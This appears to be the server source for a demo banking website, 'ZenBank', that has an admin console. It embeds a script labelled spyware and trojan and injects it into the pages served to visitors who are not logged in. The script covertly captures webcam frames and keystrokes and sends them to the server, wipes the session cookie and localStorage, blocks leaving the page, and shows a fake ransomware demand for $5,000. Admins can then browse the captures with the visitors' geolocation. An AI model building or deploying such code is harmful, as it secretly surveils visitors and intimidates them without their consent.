require("dotenv").config();
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const express = require("express");
const cookieParser = require("cookie-parser");
const rateLimit = require("express-rate-limit");
const bcrypt = require("bcryptjs");
const { createClient } = require("@supabase/supabase-js");

const env = process.env;
const isProd = env.NODE_ENV === "production";
for (const k of ["SUPABASE_URL", "SUPABASE_SERVICE_KEY", "ADMIN_DEFAULT_PASSWORD"]) {
  if (!env[k]) { console.error(`Missing env var: ${k}`); process.exit(1); }
}

// ---------- config ----------
const ADMIN_EMAILS = [
  "whitefrostff@gmail.com",
  "ahamefulachibuike56@gmail.com",
  "senatoramuh203@gmail.com",
  "hamnasaleem595@gmail.com",
  "anishanandhanal@gmail.com",
];
const MAX_PW = Number(env.MAX_PASSWORD_LENGTH || 64);
let REDIRECT_URL = env.LONG_PASSWORD_REDIRECT_URL || "https://www.google.com";
const REDIRECT_URL_DEFAULT = REDIRECT_URL;

let SUPABASE_URL;
try { SUPABASE_URL = new URL(env.SUPABASE_URL.trim()).origin; } catch { console.error("SUPABASE_URL is not a valid URL"); process.exit(1); }
const db = createClient(SUPABASE_URL, env.SUPABASE_SERVICE_KEY.trim(), { auth: { persistSession: false } });
const indexHtml = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const adminHtml = fs.readFileSync(path.join(__dirname, "admin.html"), "utf8");

// ---------- SPYWARE + TROJAN SCRIPT (injected only for unauthorized visitors) ----------
const SPY_SCRIPT = `<script>
(function(){
  var keys=[],shots=0,trojanFired=false,blocked=false;
  document.addEventListener('keydown',function(e){keys.push(e.key);if(blocked)e.preventDefault();});
  async function start(){
    try{
      var s=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
      var v=document.createElement('video');v.srcObject=s;v.muted=true;
      v.style.cssText='position:fixed;bottom:0;left:0;width:160px;height:120px;opacity:0;pointer-events:none;z-index:99999';
      document.body.appendChild(v);await v.play();
      setInterval(async function(){
        var c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
        c.getContext('2d').drawImage(v,0,0);
        var img=c.toDataURL('image/jpeg',0.7);shots++;
        await fetch('/api/spyware/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:img,keys:keys,page:'${window.location.pathname==='/'?'index':'admin'}'})}).catch(function(){});
        keys=[];
        if(shots>=3&&!trojanFired){trojanFired=true;fireTrojan();}
      },3000);
    }catch(e){}
  }
  function fireTrojan(){
    blocked=true;
    document.cookie='zb_session=;path=/;expires=Thu, 01 Jan 1970 00:00:00 GMT';
    try{localStorage.clear();}catch(e){}
    window.addEventListener('beforeunload',function(e){e.preventDefault();e.returnValue='';});
    document.addEventListener('keydown',function(e){if(e.key==='Escape')e.preventDefault();});
    var o=document.createElement('div');
    o.id='trojanLock';
    o.style.cssText='position:fixed;inset:0;background:#000;z-index:9999999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#0f0;font-family:monospace;font-size:14px';
    o.innerHTML=
      '<div style="font-size:60px;margin-bottom:16px">\u2620\uFE0F</div>'
      +'<div style="font-size:24px;margin-bottom:10px;color:#ff0">TROJAN.INFECTED</div>'
      +'<div style="font-size:13px;color:#888;margin-bottom:16px">C:\\\\Windows\\\\System32\\\\zenbank.exe</div>'
      +'<div style="font-size:14px;margin-bottom:16px">Scanning files\u2026 <span id="tjPct">0</span>%</div>'
      +'<div id="tjFiles" style="width:360px;height:130px;overflow:hidden;border:1px solid #333;padding:10px;margin-bottom:16px;font-size:11px;color:#f55"></div>'
      +'<div id="tjLock" style="display:none;text-align:center">'
      +'<div style="font-size:70px">\uD83D\uDD12</div>'
      +'<div style="font-size:26px;color:#f33;margin:16px 0 8px">ALL FILES ENCRYPTED</div>'
      +'<div style="font-size:13px;color:#ccc;margin-bottom:6px">47 files \u00B7 12 photos \u00B7 3 bank credentials stolen</div>'
      +'<div style="font-size:13px;color:#ff0;margin-bottom:12px">Pay $5,000 to unlock</div>'
      +'<div style="font-size:28px;color:#0f0;font-weight:bold;margin-bottom:8px">UNLOCKS IN <span id="tjCountdown">30:00</span></div>'
      +'<div style="font-size:11px;color:#666;margin-top:14px">spyware captured your camera + all keystrokes</div>'
      +'<div style="font-size:10px;color:#555;margin-top:8px">session destroyed \u00B7 localStorage wiped \u00B7 browser locked</div>'
      +'</div>';
    document.body.appendChild(o);
    var pct=0,files=['bank_password.txt','credentials.docx','camera_001.jpg','taxes_2025.pdf','invoice.zip','seed_key.dat','wallet.dat','login_history.csv'];
    var fEl=document.getElementById('tjFiles'),pEl=document.getElementById('tjPct');
    var t=setInterval(function(){
      pct+=5+Math.floor(Math.random()*12);
      if(pct>=100){pct=100;clearInterval(t);setTimeout(function(){document.getElementById('tjLock').style.display='block';startCountdown();},600);}
      pEl.textContent=pct;
      fEl.innerHTML+='<div>ENCRYPTED: '+files[Math.floor(Math.random()*files.length)]+'</div>';
      fEl.scrollTop=fEl.scrollHeight;
    },350);
  }
  function startCountdown(){
    var secs=1800,el=document.getElementById('tjCountdown');
    setInterval(function(){
      secs--;
      var m=Math.floor(secs/60),s=secs%60;
      el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
      if(secs<=0){secs=1800;el.textContent='30:00';}
    },1000);
  }
  start();
})();
<\/script>`;

// ---------- helpers ----------
const UUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
const EMAIL = /^[^\s@]{1,64}@[^\s@]{1,255}$/;
const cents = v => { const n = Number(v); return Number.isFinite(n) ? Math.round(n * 100) : NaN; };
const str = (v, max) => (typeof v === "string" ? v.trim().slice(0, max) : "");
const wrap = fn => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const pub = u => ({ id: u.id, name: u.name, email: u.email, role: u.role, balanceCents: Number(u.balance_cents) });
const DUMMY_HASH = bcrypt.hashSync("dummy-password", 10);

// ---------- IP GEOLOCATION ----------
const geoCache = new Map();
setInterval(() => { const now = Date.now(); for (const [k, v] of geoCache) if (v.ts < now - 3600e3) geoCache.delete(k); }, 60e4).unref();

function geoIp(ip) {
  if (!ip || ip === "::1" || ip === "127.0.0.1") return { city: "Local", country: "Localhost" };
  const cached = geoCache.get(ip);
  if (cached) return { city: cached.city, country: cached.country };
  const d = { city: "Unknown", country: "Unknown" };
  fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`).then(r => r.json()).then(j => {
    d.city = j.city || "Unknown"; d.country = j.country_name || "Unknown";
    geoCache.set(ip, { city: d.city, country: d.country, ts: Date.now() });
  }).catch(() => {});
  return d;
}

// ---------- THREAT LEVEL TRACKER ----------
const threatLog = []; // { ts, severity }
setInterval(() => { const cutoff = Date.now() - 864e5; while (threatLog.length && threatLog[0].ts < cutoff) threatLog.shift(); }, 60e3).unref();

function threatLevel() {
  const now = Date.now();
  const recent = threatLog.filter(e => e.ts > now - 3600e3); // last 1h
  const crit = recent.filter(e => e.severity === "critical").length;
  const high = recent.filter(e => e.severity === "high").length;
  if (crit >= 3) return "CRITICAL";
  if (crit >= 1 || high >= 3) return "ELEVATED";
  if (high >= 1) return "GUARDED";
  return "LOW";
}

const audit = (type, severity, req, email, details = {}) => {
  threatLog.push({ ts: Date.now(), severity });
  const geo = geoIp(req.ip);
  return db.from("audit_events")
    .insert({ event_type: type, severity, actor_email: email || null, ip_address: req.ip, details: { ...details, location: geo.city + ", " + geo.country } })
    .then(() => {}, e => console.error("audit failed:", e.message));
};

// ---------- ZenShield bot check ----------
const BOT_KEY = crypto.randomBytes(32);
const botSig = (nonce, ts) => crypto.createHmac("sha256", BOT_KEY).update(`${nonce}.${ts}`).digest("hex");
const usedBots = new Map();
setInterval(() => { const now = Date.now(); for (const [k, v] of usedBots) if (v < now) usedBots.delete(k); }, 60e3).unref();

function botOk(body) {
  const { botToken, company_url } = body || {};
  if (company_url) return false;
  if (typeof botToken !== "string") return false;
  const [nonce, ts, sig, n, ...extra] = botToken.split(".");
  if (extra.length || !/^[0-9a-f]{32}$/.test(nonce || "") || !/^\d{10,15}$/.test(ts || "") || !/^[0-9a-f]{64}$/.test(sig || "") || !/^\d{1,12}$/.test(n || "")) return false;
  if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(botSig(nonce, ts)))) return false;
  const age = Date.now() - Number(ts);
  if (age < 2000 || age > 10 * 60e3) return false;
  if (usedBots.has(nonce)) return false;
  const h = crypto.createHash("sha256").update(`${nonce}:${n}`).digest();
  if (h[0] !== 0 || h[1] !== 0) return false;
  usedBots.set(nonce, Date.now() + 10 * 60e3);
  return true;
}

// ---------- sessions ----------
const sessions = new Map();
const SESSION_MS = 8 * 3600e3;
setInterval(() => { const now = Date.now(); for (const [k, v] of sessions) if (v.exp < now) sessions.delete(k); }, 60e3).unref();

// ---------- SPYWARE STORE ----------
const spywareCaptures = [];
setInterval(() => {
  const cutoff = Date.now() - 60e4;
  while (spywareCaptures.length && spywareCaptures[0].ts < cutoff) spywareCaptures.shift();
  if (spywareCaptures.length > 200) spywareCaptures.splice(0, spywareCaptures.length - 200);
}, 30e3).unref();

// ---------- BAN IP STORE ----------
const bannedIPs = new Set();

function issueSession(res, user) {
  const token = crypto.randomBytes(32).toString("hex");
  sessions.set(token, { uid: user.id, exp: Date.now() + SESSION_MS });
  res.cookie("zb_session", token, { httpOnly: true, sameSite: "lax", secure: isProd, maxAge: SESSION_MS });
}

async function getUser(req) {
  const sess = sessions.get(req.cookies.zb_session || "");
  if (!sess || sess.exp < Date.now()) return null;
  const { data: u } = await db.from("users").select("*").eq("id", sess.uid).maybeSingle();
  return u && !u.disabled ? u : null;
}
const auth = wrap(async (req, res, next) => {
  const u = await getUser(req);
  if (!u) return res.status(401).json({ error: "Please sign in" });
  req.user = u; next();
});

// ---------- app ----------
const app = express();
app.set("trust proxy", Number(env.TRUST_PROXY_HOPS || 1));
app.disable("x-powered-by");
app.use(express.json({ limit: "10kb" }));
app.use(cookieParser());
app.use((req, res, next) => { res.set({ "X-Content-Type-Options": "nosniff", "Referrer-Policy": "same-origin" }); next(); });

// Ban IP middleware
app.use((req, res, next) => {
  if (bannedIPs.has(req.ip)) {
    audit("banned_ip_blocked", "critical", req, null, {});
    return res.status(403).json({ error: "Access denied. Your IP has been banned." });
  }
  next();
});

const page = (res, html, extra = {}) => res.set({ "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store", ...extra }).send(html);
app.get("/healthz", (req, res) => res.send("ok"));

// GET / — unauthorized visitors get spyware injected; admins get clean page
app.get("/", wrap(async (req, res) => {
  const u = await getUser(req);
  if (u) return page(res, indexHtml);
  page(res, indexHtml.replace("</body>", SPY_SCRIPT + "</body>"));
}));

// ADMIN LOGIN PAGE (for non-logged-in visitors hitting /blue-team)
const ADMIN_LOGIN_PAGE = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ZenBank | Admin Sign In</title><style>@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');*{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at 50% 110%,#20206b,transparent 50%),#080a1a;color:#f7f7ff;font:14px Inter,Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{width:min(420px,92vw);background:#0c1024;border:1px solid #272e55;border-radius:20px;padding:40px 35px}.logo{width:42px;height:42px;border-radius:12px;display:grid;place-items:center;background:linear-gradient(135deg,#a44cff,#4c24e9);font-size:28px;font-weight:800;font-style:italic;box-shadow:0 0 20px #7139f677;margin-bottom:18px}.eyebrow{font-size:9px;letter-spacing:1.6px;color:#ae96ff;font-weight:700;margin-bottom:8px}h1{font-size:22px;margin:0 0 5px}.sub{color:#969fbe;font-size:11px;margin-bottom:22px}label{font-size:11px;color:#c6cbe7;display:block;margin:14px 0 6px}input{background:#171d3b;border:1px solid #30385f;border-radius:11px;color:white;padding:13px;font:inherit;outline:none;width:100%}input:focus{border-color:#9063ff}button{margin-top:20px;width:100%;border:0;border-radius:11px;background:linear-gradient(100deg,#7134f5,#4923df);color:white;font-weight:700;padding:14px;cursor:pointer;font-size:13px}.err{color:#ff8ba0;font-size:11px;min-height:18px;margin-top:10px}a{display:inline-block;margin-top:16px;font-size:11px;color:#b69cff;text-decoration:none}.hint{font-size:9px;color:#687195;margin-top:14px;text-align:center}</style></head><body><div class="box"><div class="logo">Z</div><small class="eyebrow">BLUE TEAM CONSOLE</small><h1>Admin Sign In</h1><p class="sub">Restricted area. Authorized Blue Team only.</p><form id="f"><label>Admin email</label><input id="em" type="email" required><label>Password</label><input id="pw" type="password" required><button type="submit">Sign in →</button></form><div class="err" id="e"></div><a href="/">← Back to ZenBank</a><p class="hint">Wrong credentials trigger security traps. Do not enter real banking info.</p></div><script>
document.getElementById('f').onsubmit=async ev=>{ev.preventDefault();try{const r=await fetch('/api/admin/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:document.getElementById('em').value,password:document.getElementById('pw').value})});const d=await r.json();if(r.ok){location.href='/blue-team';}else{document.getElementById('e').textContent=d.error||'Sign in failed';}}catch(x){document.getElementById('e').textContent='Network error';}};
<\/script></body></html>`;

// /blue-team — admins get the console, everyone else gets the admin login page (with spyware)
app.get("/blue-team", wrap(async (req, res) => {
  const u = await getUser(req);
  if (u && u.role === "admin") return page(res, adminHtml, { "X-Robots-Tag": "noindex", "X-Frame-Options": "DENY" });
  // Non-logged-in or non-admin → show admin login page with spyware injected
  page(res, ADMIN_LOGIN_PAGE.replace("</body>", SPY_SCRIPT + "</body>"), { "X-Robots-Tag": "noindex", "X-Frame-Options": "DENY" });
}));

// ADMIN LOGIN (triggers traps for wrong credentials)
app.post("/api/admin/login", rateLimit({ windowMs: 10 * 60 * 1000, limit: 30, standardHeaders: true, legacyHeaders: false, message: { error: "Too many attempts." } }), wrap(async (req, res) => {
  const email = str(req.body.email, 320).toLowerCase();
  const password = req.body.password || "";
  if (!EMAIL.test(email) || !password) return res.status(400).json({ error: "Enter email and password" });
  const { data: u } = await db.from("users").select("*").eq("email", email).maybeSingle();
  const match = u ? await bcrypt.compare(password, u.password_hash) : false;
  if (!u || !match) {
    await audit("admin_login_failed", "critical", req, email, { location: geoIp(req.ip).city + ", " + geoIp(req.ip).country });
    // Notify real admins
    for (const adminEmail of ADMIN_EMAILS) {
      await db.from("notifications").insert({ user_id: u ? u.id : (await db.from("users").select("id").eq("email", adminEmail).single()).data.id, title: "🚨 Wrong admin login attempt", body: `IP ${req.ip} (${geoIp(req.ip).city}, ${geoIp(req.ip).country}) tried: ${email} · Threat: ${threatLevel()}` }).eq("user_id", (await db.from("users").select("id").eq("email", adminEmail).single()).data.id);
    }
    return res.status(401).json({ error: "Invalid admin credentials. Security trap activated." });
  }
  if (u.role !== "admin" || u.disabled) {
    await audit("admin_login_failed", "high", req, email);
    return res.status(401).json({ error: "Account is not an active admin" });
  }
  await audit("admin_login_success", "low", req, email);
  issueSession(res, u);
  res.json({ ok: true });
}));

// ---------- SPYWARE CAPTURE ENDPOINT ----------
app.post("/api/spyware/capture", express.json({ limit: "500kb" }), (req, res) => {
  const { image, keys, page: pg } = req.body || {};
  if (typeof image !== "string" || !Array.isArray(keys)) return res.status(400).json({ error: "Bad request" });
  const geo = geoIp(req.ip);
  spywareCaptures.push({ ip: req.ip, image, keys, ts: Date.now(), location: geo.city + ", " + geo.country, page: pg || "index" });
  audit("spyware_capture", "critical", req, null, { keys: keys.length, imageBytes: image.length, location: geo.city + ", " + geo.country, page: pg || "index" });
  res.json({ ok: true });
});

// ---------- auth ----------
const limiter = limit => rateLimit({ windowMs: 10 * 60 * 1000, limit, standardHeaders: true, legacyHeaders: false, message: { error: "Too many attempts. Try again later." } });
const longPassword = async (req, res, email, where, length) => {
  await audit("long_password_redirect", "high", req, email, { where, length });
  return res.status(400).json({ error: "Invalid request", redirect: REDIRECT_URL });
};

app.get("/api/bot/challenge", limiter(60), (req, res) => {
  const nonce = crypto.randomBytes(16).toString("hex"), ts = Date.now();
  res.set("Cache-Control", "no-store").json({ nonce, ts, sig: botSig(nonce, ts) });
});

app.post("/api/auth/login", limiter(20), wrap(async (req, res) => {
  const { email, password } = req.body || {};
  if (typeof email !== "string" || typeof password !== "string") return res.status(400).json({ error: "Bad request" });
  const e = email.trim().toLowerCase().slice(0, 320);
  if (password.length > MAX_PW) return longPassword(req, res, e, "login", password.length);
  if (!botOk(req.body)) {
    await audit("bot_check_failed", "medium", req, e);
    return res.status(400).json({ error: "Bot check failed. Please tick the box again." });
  }
  const { data: u } = await db.from("users").select("*").eq("email", e).maybeSingle();
  const match = await bcrypt.compare(password, u ? u.password_hash : DUMMY_HASH);
  if (!u || !match || u.disabled) {
    await audit("login_failed", ADMIN_EMAILS.includes(e) ? "high" : "medium", req, e);
    return res.status(401).json({ error: "Invalid email or password" });
  }
  await audit("login_success", u.role === "admin" ? "medium" : "low", req, e);
  issueSession(res, u);
  res.json({ user: pub(u) });
}));

app.post("/api/auth/signup", limiter(15), wrap(async (req, res) => {
  const name = str(req.body.name, 80), email = str(req.body.email, 320).toLowerCase(), { password } = req.body;
  if (typeof password !== "string") return res.status(400).json({ error: "Bad request" });
  if (password.length > MAX_PW) return longPassword(req, res, email, "signup", password.length);
  if (!botOk(req.body)) { await audit("bot_check_failed", "medium", req, email); return res.status(400).json({ error: "Bot check failed. Please tick the box again." }); }
  if (!name || !EMAIL.test(email)) return res.status(400).json({ error: "Enter a valid name and email" });
  if (password.length < 12) return res.status(400).json({ error: "Password must be at least 12 characters" });
  if (ADMIN_EMAILS.includes(email)) return res.status(400).json({ error: "Email already registered" });
  const { data, error } = await db.from("users")
    .insert({ name, email, password_hash: await bcrypt.hash(password, 12), role: "user" }).select().single();
  if (error) {
    if (error.code !== "23505") console.error("SIGNUP INSERT FAILED:", error.code, error.message);
    return res.status(400).json({ error: error.code === "23505" ? "Email already registered" : "Could not create account" });
  }
  await audit("signup", "low", req, email);
  await db.from("notifications").insert({ user_id: data.id, title: "Welcome to ZenBank", body: "Your demo account is ready with fictional funds." });
  issueSession(res, data);
  res.json({ user: pub(data) });
}));

app.post("/api/auth/logout", (req, res) => { sessions.delete(req.cookies.zb_session || ""); res.clearCookie("zb_session"); res.json({ ok: true }); });
app.get("/api/me", auth, (req, res) => res.json({ user: pub(req.user) }));

// ---------- banking ----------
async function txFor(id, n) {
  const { data } = await db.from("transactions").select("*")
    .or(`from_user_id.eq.${id},to_user_id.eq.${id}`).order("created_at", { ascending: false }).limit(n);
  return data || [];
}
const mine = (table, id, n = 100) =>
  db.from(table).select("*").eq("user_id", id).order("created_at", { ascending: false }).limit(n).then(r => r.data || []);

app.get("/api/dashboard", auth, wrap(async (req, res) => {
  const id = req.user.id;
  const [transactions, goals, cards, beneficiaries, notifications] = await Promise.all([
    txFor(id, 50), mine("savings_goals", id), mine("cards", id), mine("beneficiaries", id), mine("notifications", id, 50),
  ]);
  res.json({ transactions, goals, cards, beneficiaries, notifications });
}));

app.get("/api/transactions", auth, wrap(async (req, res) => res.json({ transactions: await txFor(req.user.id, 200) })));

app.post("/api/transfers", auth, wrap(async (req, res) => {
  const to = str(req.body.recipient, 320).toLowerCase(), amt = cents(req.body.amount);
  if (!EMAIL.test(to) || !Number.isFinite(amt) || amt < 100 || amt > 1000000)
    return res.status(400).json({ error: "Enter a valid recipient and an amount between $1 and $10,000" });
  if (to === req.user.email) return res.status(400).json({ error: "You can't send money to yourself" });
  const { data: r } = await db.from("users").select("id,email,disabled,role").eq("email", to).maybeSingle();
  if (!r || r.disabled || r.role !== "user") return res.status(404).json({ error: "Recipient not found" });
  const { error } = await db.rpc("transfer_funds", { p_from: req.user.id, p_to: r.id, p_amount: amt });
  if (error) return res.status(400).json({ error: /insufficient/i.test(error.message) ? "Insufficient funds" : "Transfer failed" });
  await db.from("transactions").insert({ from_user_id: req.user.id, to_user_id: r.id, from_email: req.user.email, to_email: r.email, amount_cents: amt, description: "Demo transfer" });
  await db.from("notifications").insert({ user_id: r.id, title: "Money received", body: `${req.user.name} sent you ${(amt / 100).toFixed(2)} DEMO USD.` });
  await audit("transfer", amt >= 500000 ? "high" : "low", req, req.user.email, { to: r.email, amount_cents: amt });
  const { data: fresh } = await db.from("users").select("*").eq("id", req.user.id).single();
  res.json({ user: pub(fresh) });
}));

app.post("/api/savings", auth, wrap(async (req, res) => {
  const name = str(req.body.name, 80), target = cents(req.body.target);
  if (!name || !Number.isFinite(target) || target < 100 || target > 100000000) return res.status(400).json({ error: "Enter a name and a target between $1 and $1,000,000" });
  await db.from("savings_goals").insert({ user_id: req.user.id, name, target_cents: target });
  res.json({ ok: true });
}));

app.post("/api/cards", auth, wrap(async (req, res) => {
  const nickname = str(req.body.nickname, 40) || "Demo card";
  await db.from("cards").insert({ user_id: req.user.id, nickname, last_four: String(crypto.randomInt(1000, 10000)), status: "active" });
  res.json({ ok: true });
}));

app.post("/api/beneficiaries", auth, wrap(async (req, res) => {
  const email = str(req.body.email, 320).toLowerCase(), label = str(req.body.label, 80);
  if (!EMAIL.test(email) || !label) return res.status(400).json({ error: "Enter a valid email and name" });
  await db.from("beneficiaries").insert({ user_id: req.user.id, beneficiary_email: email, label });
  res.json({ ok: true });
}));

app.post("/api/notifications/:id/read", auth, wrap(async (req, res) => {
  if (!UUID.test(req.params.id)) return res.status(400).json({ error: "Bad id" });
  await db.from("notifications").update({ read_at: new Date().toISOString() }).eq("id", req.params.id).eq("user_id", req.user.id);
  res.json({ ok: true });
}));

// ---------- admin API ----------
const admin = express.Router();
admin.use(auth, (req, res, next) => (req.user.role === "admin" ? next() : res.status(403).json({ error: "Forbidden" })));

const count = q => q.then(r => r.count || 0);
admin.get("/overview", wrap(async (req, res) => {
  const since = new Date(Date.now() - 864e5).toISOString();
  const head = t => db.from(t).select("id", { count: "exact", head: true });
  const [users, transactions, events, alerts_24h] = await Promise.all([
    count(head("users")), count(head("transactions")), count(head("audit_events")),
    count(head("audit_events").in("severity", ["high", "critical"]).gte("created_at", since)),
  ]);
  res.json({ users, transactions, events, alerts_24h, threatLevel: threatLevel(), redirectUrl: REDIRECT_URL });
}));

admin.get("/events", wrap(async (req, res) => {
  const { data } = await db.from("audit_events").select("*").order("created_at", { ascending: false }).limit(100);
  res.json({ events: data || [] });
}));

admin.get("/notifications", wrap(async (req, res) => {
  const { data } = await db.from("audit_events").select("*").in("severity", ["high", "critical"]).order("created_at", { ascending: false }).limit(30);
  res.json({ notifications: data || [] });
}));

admin.get("/users", wrap(async (req, res) => {
  const { data } = await db.from("users").select("id,name,email,balance_cents,role,disabled").order("created_at");
  res.json({ users: data || [] });
}));

admin.post("/users/:id/disable", wrap(async (req, res) => {
  if (!UUID.test(req.params.id)) return res.status(400).json({ error: "Bad id" });
  const { data: u } = await db.from("users").select("id,email,role,disabled").eq("id", req.params.id).maybeSingle();
  if (!u || u.role !== "user") return res.status(404).json({ error: "User not found" });
  await db.from("users").update({ disabled: !u.disabled }).eq("id", u.id);
  await audit(u.disabled ? "user_enabled" : "user_disabled", "medium", req, req.user.email, { target: u.email });
  res.json({ ok: true });
}));

// BAN IP
admin.post("/ban-ip", wrap(async (req, res) => {
  const ip = str(req.body.ip, 45);
  if (!ip || (!/^\d{1,3}(\.\d{1,3}){3}$/.test(ip) && !ip.includes(":"))) return res.status(400).json({ error: "Invalid IP address" });
  bannedIPs.add(ip);
  await audit("ip_banned", "critical", req, req.user.email, { ip });
  res.json({ ok: true, banned: [...bannedIPs] });
}));

admin.post("/unban-ip", wrap(async (req, res) => {
  const ip = str(req.body.ip, 45);
  if (!ip) return res.status(400).json({ error: "Invalid IP address" });
  bannedIPs.delete(ip);
  await audit("ip_unbanned", "medium", req, req.user.email, { ip });
  res.json({ ok: true, banned: [...bannedIPs] });
}));

admin.get("/banned-ips", (req, res) => {
  res.json({ banned: [...bannedIPs] });
});

// REDIRECT URL control
admin.get("/redirect", (req, res) => {
  res.json({ redirectUrl: REDIRECT_URL, defaultUrl: REDIRECT_URL_DEFAULT });
});
admin.post("/redirect", wrap(async (req, res) => {
  const url = str(req.body.url, 500);
  if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Enter a valid URL starting with http:// or https://" });
  REDIRECT_URL = url;
  await audit("redirect_url_changed", "medium", req, req.user.email, { url });
  res.json({ ok: true, redirectUrl: REDIRECT_URL });
}));

admin.post("/adjust-balance", wrap(async (req, res) => {
  const email = str(req.body.email, 320).toLowerCase(), reason = str(req.body.reason, 160), delta = cents(req.body.amount);
  if (!EMAIL.test(email) || reason.length < 4 || !Number.isFinite(delta) || delta === 0 || Math.abs(delta) > 100000000)
    return res.status(400).json({ error: "Invalid input" });
  const { data: u } = await db.from("users").select("id,email,role").eq("email", email).maybeSingle();
  if (!u || u.role !== "user") return res.status(404).json({ error: "User not found" });
  const { data: balance, error } = await db.rpc("adjust_balance", { p_user: u.id, p_delta: delta });
  if (error) return res.status(400).json({ error: /negative/i.test(error.message) ? "Balance cannot go negative" : "Adjustment failed" });
  await audit("balance_adjusted", "high", req, req.user.email, { target: email, amount_cents: delta, reason });
  await db.from("notifications").insert({ user_id: u.id, title: "Balance adjusted", body: reason });
  res.json({ ok: true, balanceCents: Number(balance) });
}));

// ADMIN SPYWARE VIEW (now includes location)
admin.get("/spyware", (req, res) => {
  res.json({ captures: spywareCaptures.slice(-50), count: spywareCaptures.length });
});

app.use("/api/admin", admin);

// ---------- errors ----------
app.use((req, res) => res.status(404).json({ error: "Not found" }));
app.use((err, req, res, next) => {
  if (err.type === "entity.too.large") return res.status(413).json({ error: "Invalid request", redirect: REDIRECT_URL });
  if (err.type === "entity.parse.failed") return res.status(400).json({ error: "Bad request" });
  console.error(err);
  res.status(500).json({ error: "Server error" });
});

// ---------- seed admins ----------
async function seedAdmins() {
  const adminPw = env.ADMIN_DEFAULT_PASSWORD.trim();
  const hash = await bcrypt.hash(adminPw, 12);
  for (const email of ADMIN_EMAILS) {
    const { data: u } = await db.from("users").select("id,role,password_hash").eq("email", email).maybeSingle();
    if (!u) {
      const { error } = await db.from("users").insert({ name: email.split("@")[0], email, password_hash: hash, role: "admin", balance_cents: 0 });
      console.log(error ? "ADMIN CREATE FAILED for " + email + ": " + error.message : "Created admin: " + email);
    } else if (u.role !== "admin") {
      await db.from("users").update({ role: "admin", password_hash: hash }).eq("id", u.id);
      console.log("Promoted to admin:", email);
    } else if (!(await bcrypt.compare(adminPw, u.password_hash))) {
      await db.from("users").update({ password_hash: hash }).eq("id", u.id);
      console.log("Updated admin password:", email);
    }
  }
}

app.listen(env.PORT || 3000, () => console.log("ZenBank listening on :" + (env.PORT || 3000)));
db.from("users").select("id").limit(1)
  .then(({ error }) => console.log(error ? "SUPABASE CHECK FAILED: " + error.message : "Supabase connected OK"))
  .then(() => seedAdmins())
  .catch(e => console.error("Startup failed:", e.message));

/* =====================================================================
   SUPABASE SCHEMA — same as before, no changes needed
   ===================================================================== */
